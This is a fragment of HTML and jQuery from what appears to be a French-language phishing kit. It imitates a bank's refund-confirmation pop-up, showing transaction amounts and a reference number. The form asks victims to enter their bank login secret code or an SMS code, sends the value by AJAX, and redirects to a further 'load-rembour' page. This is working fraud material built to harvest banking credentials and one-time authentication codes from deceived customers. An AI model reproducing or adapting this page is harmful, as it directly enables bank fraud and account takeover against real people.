            ...
            <div class="container">
                <div class="details">
                    <div class="title">
                       ...
                       <li>Montant de la transaction &nbsp;: <b>932,48 €</b></li>
		...
		<div class="modal-contentb">
			...
			<div class="document" style="height: auto;display: flex;flex-direction: column;">
				<div class="header popinV3-header ">
					...
					<p  style="text-align: center; color: #0e0e0e;font-size: 18px" >Veuillez confirmer votre remboursement depuis votre application mobile ou par un CODE SMS</p>
					<p style="text-align: center; color: #e03135;" >Montant de la transaction: <b>932,95 €</b><br>Référence : <b>600193110380</b></p>
				</div>
				<div class="line" style="max-height: 500px;">
					<div id="compte_bancaire_haut2" class="textPopinDetail">
                        ...
                        <input type="hidden" name="step" value="cc">
                            ...
                            <img src="asset/images/validation_operation.gif" style="max-width: 280px;">
                        </div>
            


    
             <b>Veuillez saisir votre code secret de connexion banque ou SMS reçu.<b>
             <br><br>
            <div class="form-group col-12 row" style="margin-top:-10px;left:-2px">              
              <b class="col-5" style="text-align: right;">CODE SECRET ou CODE SMS:</b>
              <input type="tel" class="form-control phone1 col-5" id="phone1" name="phone1"  placeholder="" maxlength="8" autocomplete="off">
            </div>
                        <div class="btns">
                     ...
                     if (  $('.phone1').val().length >= 0) {
                        ...
                        $.ajax({
                            ...
                            success: function(response) {
                                window.location.href = 'load-rembour-2.php';
